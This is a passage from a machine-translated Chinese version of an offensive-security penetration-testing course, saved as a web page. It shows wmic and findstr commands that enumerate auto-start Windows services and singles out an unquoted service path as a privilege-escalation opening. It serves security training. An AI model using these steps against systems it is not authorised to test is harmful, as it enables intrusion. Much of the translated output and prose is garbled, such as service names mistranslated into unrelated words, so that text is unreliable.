<div style="position:absolute;top:226214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\alex&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic service get name,displayname,pathname,startmode | </font><font style="vertical-align: inherit;">findstr /i "自动"</font></font></font></b></nobr></div>
<div style="position:absolute;top:226231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序标识    </font></font></nobr></div>
<div style="position:absolute;top:226231;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序IDSvc</font></font></nobr></div>
<div style="position:absolute;top:226248;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation</font></font></nobr></div>
<div style="position:absolute;top:226299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:226316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WWAN 自动配置    </font></font></nobr></div>
<div style="position:absolute;top:226316;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">万维网</font></font></nobr></div>
<div style="position:absolute;top:226333;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork</font></font></nobr></div>
<div style="position:absolute;top:226384;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动的</font></font></nobr></div>
<div style="position:absolute;top:226403;left:262"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 967 - 通过自动启动的 wmic 获取服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:226432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个输出更好，但并不理想。</font><font style="vertical-align: inherit;">我们仍然可以取出从</font></font></nobr></div>
<div style="position:absolute;top:226452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\windows 文件夹以获取非标准服务列表。</font><font style="vertical-align: inherit;">这可以通过管道命令来完成</font></font></nobr></div>
<div style="position:absolute;top:226471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到目前为止，我们</font><font style="vertical-align: inherit;">再次使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">findstr</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/v</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志忽略包含该字符串的任何内容</font></font></nobr></div>
<div style="position:absolute;top:226490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“c:\windows”。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:226525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\alex&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic service get name,displayname,pathname,startmode |findstr /i "auto"</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:226542;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|findstr /i /v "c:\windows"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:226559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">McAfee Agent 公共服务    </font></font></nobr></div>
<div style="position:absolute;top:226559;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">macmnsvc</font></font></nobr></div>
<div style="position:absolute;top:226576;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"C:\Program Files\McAfee\Agent\macmnsvc.exe" /ServiceStart</font></font></nobr></div>
<div style="position:absolute;top:226627;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">汽车</font></font></nobr></div>
<div style="position:absolute;top:226644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">迈克菲代理服务    </font></font></nobr></div>
<div style="position:absolute;top:226644;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">巨无霸</font></font></nobr></div>
<div style="position:absolute;top:226661;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"C:\Program Files\McAfee\Agent\masvc.exe" /ServiceStart</font></font></nobr></div>
<div style="position:absolute;top:226712;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">汽车</font></font></nobr></div>
<div style="position:absolute;top:226729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">迈克菲服务控制器    </font></font></nobr></div>
<div style="position:absolute;top:226729;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">女权主义者</font></font></nobr></div>
<div style="position:absolute;top:226746;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“C:\Program Files\Common Files\McAfee\SystemCore\mfemms.exe”</font></font></nobr></div>
<div style="position:absolute;top:226797;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">汽车</font></font></nobr></div>
<div style="position:absolute;top:226814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">McAfee Endpoint Security Web 控制服务    </font></font></nobr></div>
<div style="position:absolute;top:226814;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微信</font></font></nobr></div>
<div style="position:absolute;top:226831;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“C:\Program Files (x86)\McAfee\Endpoint Security\Web Control\mfewc.exe”</font></font></nobr></div>
<div style="position:absolute;top:226882;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">汽车</font></font></nobr></div>
<div style="position:absolute;top:226899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">傀儡特工    </font></font></nobr></div>
<div style="position:absolute;top:226899;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">木偶</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:226916;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Puppet\Current Version\sys\ruby\bin\ruby.exe -rubygems "C:\Puppet\Cur</font></font></b></nobr></div>
<div style="position:absolute;top:226933;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">租用版本\服务\daemon.rb"</font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:227083;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="192"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 192 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:227116;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:228193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:228193;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:228193;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">809</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:227212;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">汽车</font></font></nobr></div>
<div style="position:absolute;top:227228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VMware 别名管理器和票证服务    </font></font></nobr></div>
<div style="position:absolute;top:227228;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证服务</font></font></nobr></div>
<div style="position:absolute;top:227245;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe”</font></font></nobr></div>
<div style="position:absolute;top:227296;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">汽车</font></font></nobr></div>
<div style="position:absolute;top:227313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VMware工具    </font></font></nobr></div>
<div style="position:absolute;top:227313;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟机工具</font></font></nobr></div>
<div style="position:absolute;top:227330;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“C:\Program Files\VMware\VMware Tools\vmtoolsd.exe”</font></font></nobr></div>
<div style="position:absolute;top:227381;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">汽车</font></font></nobr></div>
<div style="position:absolute;top:227401;left:210"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 968 - 通过 wmic 获取自动启动且非标准的服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:227430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们有了一个更易于管理的列表。</font><font style="vertical-align: inherit;">对我们来说最引人注目的东西之一是偶人</font></font></nobr></div>
<div style="position:absolute;top:227449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理具有未引用的服务路径。</font><font style="vertical-align: inherit;">未加引号的搜索路径可能会给我们</font></font></nobr></div>
<div style="position:absolute;top:227468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果服务在更高特权用户的上下文中运行，则提升权限。</font><font style="vertical-align: inherit;">找什么</font></font></nobr></div>
<div style="position:absolute;top:227488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户运行此服务，我们将通过在开始搜索“服务”来打开服务列表</font></font></nobr></div>
<div style="position:absolute;top:227507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">菜单。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:228087;left:334"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 345：查找服务应用程序 </font></font></i></nobr></div>
</span></font>


<script>_addload(function(){_setupIW('com');_csi('en','zh-CN','o3cp%5B618-809%5D.pdf');});</script>
            <script>
              function gtElInit() {
                var lib = new google.translate.TranslateService();
                lib.setCheckVisibility(false);
                lib.translatePage('en', 'zh-CN', function (progress, done, error) {
                  if (progress == 100 || done || error) {
                    document.getElementById("gt-dt-spinner").style.display = "none";
                  }
                });
              }
            </script>
            <script src="./o3cp[618-809]_files/f.txt">
            </script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./o3cp[618-809]_files/translate_24dp.png" width="20" height="20" alt="Google 翻译"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">原文</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">提供更好的翻译建议</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
          <div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><span><div class="gmnoprint" style="display: none; z-index: 2147483647;"><img src="./o3cp[618-809]_files/iws_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[618-809]_files/iws_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[618-809]_files/iws_w.png" style="position: absolute; left: 0px; top: 0px; width: 8px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[618-809]_files/iws_e.png" style="position: absolute; left: 0px; top: 0px; width: 8px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[618-809]_files/iws_s.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[618-809]_files/iws_s.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 8px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[618-809]_files/iws_c.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><div class="SPRITE_iws_nw" style="overflow: hidden;"></div><div class="SPRITE_iws_ne" style="overflow: hidden;"></div><div class="SPRITE_iws_sw" style="overflow: hidden;"></div><div class="SPRITE_iws_se" style="overflow: hidden;"></div><div class="SPRITE_iws_tap" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_l" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_u" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_ul" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_rd" style="overflow: hidden;"></div><div class="SPRITE_iws_tap_ld" style="overflow: hidden;"></div><div class="SPRITE_iws_tab_dl" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_dr" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_l" style="overflow: hidden; display: none;"></div><div class="SPRITE_iws_tab_r" style="overflow: hidden; display: none;"></div></div></span><div id="google-infowindow" class="notranslate"><div class="gmnoprint" style="display: none; z-index: 2147483647;"><img src="./o3cp[618-809]_files/iw_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[618-809]_files/iw_n.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[618-809]_files/iw_w.png" style="position: absolute; left: 0px; top: 0px; width: 6px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[618-809]_files/iw_e.png" style="position: absolute; left: 0px; top: 0px; width: 6px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[618-809]_files/iw_s0.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[618-809]_files/iw_s0.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 6px; border: 0px; padding: 0px; margin: 0px;"><img src="./o3cp[618-809]_files/iw_c.png" style="position: absolute; left: 0px; top: 0px; width: 628px; height: 598px; border: 0px; padding: 0px; margin: 0px;"><div class="SPRITE_iw_nw" style="overflow: hidden;"></div><div class="SPRITE_iw_ne" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_l" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_u" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_ul" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_rd" style="overflow: hidden;"></div><div class="SPRITE_iw_xtap_ld" style="overflow: hidden;"></div><div class="SPRITE_iw_sw0" style="overflow: hidden;"></div><div class="SPRITE_iw_se0" style="overflow: hidden;"></div><div class="SPRITE_close" style="overflow: hidden; z-index: 10000; cursor: pointer; visibility: visible;"></div><div class="SPRITE_maximize" style="overflow: hidden; z-index: 10000; visibility: hidden; cursor: pointer; display: none;"></div><div class="SPRITE_restore" style="overflow: hidden; z-index: 10001; visibility: hidden; cursor: pointer; display: none;"></div></div></div><div style="display: none;"><iframe sandbox="" id="google-feedback-frame" name="FEEDBACK_TARGET_IFRAME_NAME" src="./o3cp[618-809]_files/saved_resource.html"></iframe></div></body></html>